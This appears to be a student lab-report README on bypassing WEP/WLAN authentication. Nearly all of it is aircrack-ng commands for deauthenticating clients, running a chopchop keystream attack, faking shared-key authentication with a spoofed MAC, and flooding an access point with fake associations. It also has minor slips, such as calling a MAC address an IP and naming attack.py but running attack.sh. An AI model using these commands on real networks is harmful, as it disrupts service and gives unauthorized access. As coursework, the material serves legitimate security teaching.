# WEP_WPA_Bypass
<br>
          <b>BÁO CÁO BÀI TẬP</b><br>
- Môn học: An toàn Mạng không dây và di động<br>
- Kỳ báo cáo: Buổi 03 (Session 03)<br>
- Tên chủ đề: VƯỢT QUA XÁC THỰC MẠNG WLAN<br>
- Bypassing WLAN Authentication<br>
- GV: Lê Đức Thịnh<br>
- Ngày báo cáo: 24/4/2023<br>
- Nhóm: 802.11<br>
- Lớp: NT330.N21.ANTT.1<br>
  - 20521047	20521047@gm.uit.edu.vn <br>
  - 20520514	20520514@gm.uit.edu.vn <br>
  
<h1>Tested on TL-WR841N & ParrotOS because my Kali Linux do not support monitor mode on TL-WN725N USB Wifi, so I use Parrot, and wlan0 is replaced by <i>wlx9ca2f4fd78ac</i>
<h1>

- All commands that I used
  - To see wireless interface, use `iwconfig`
  - To start monitor mode, use `airmon-ng start wlan0`
  - You can use option -c to send deauth attack to specific users.
  ```
  aireplay-ng -0 5 -a <AP's MAC> -c <IP's Client> wlan0mon
  ```
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/36d6f5f4-e763-4975-8714-2d794975eaff)
  - To see all access points, use.
  ```
  airodump-ng wlan0mon
  ```
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/a5b72f9b-aed3-4d91-9fb3-492e4513c7db)
  - To sniff packets between Client and access point, use.
  ```
  airodump-ng wlan0mon -c <channel> --bssid <mac AP> -w keystream 
  ```
  - If you do not have the .xor file, create it by using chopchop attack.
  ```
  aireplay-ng -h <Your device which you use to connect> -a <mac AP> wlan0mon
  ```
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/97bb6bf8-43bb-4d09-8794-04e629b33afe)
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/ad149d0a-7062-4b33-b3a4-1e572dc51e22) 
  - To fake SKA, use
  ```
  aireplay-ng -1 0 -e "Nhom 802.11" -y <keystream.xor> -a <MAC AP> -h AA:AA:AA:AA:AA:AA wlan0mon
  ```
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/de87245a-4bef-4b29-a673-68561f6d26dd)
  - Run attack.py, then you must open another terminal and run `airodump-ng wlan0mon -c <channel> --bssid <mac AP> -w keystream `
  ```
  ./attack.sh <number you want> <mac AP> <wireless adapter>
  ```
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/502d55a6-8136-4076-8cb7-eaa542d9b03b)
   > Below is overload, cannot be connected more
  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/294b804f-8b2e-4c38-9751-b9cbc35987d8)


  





 
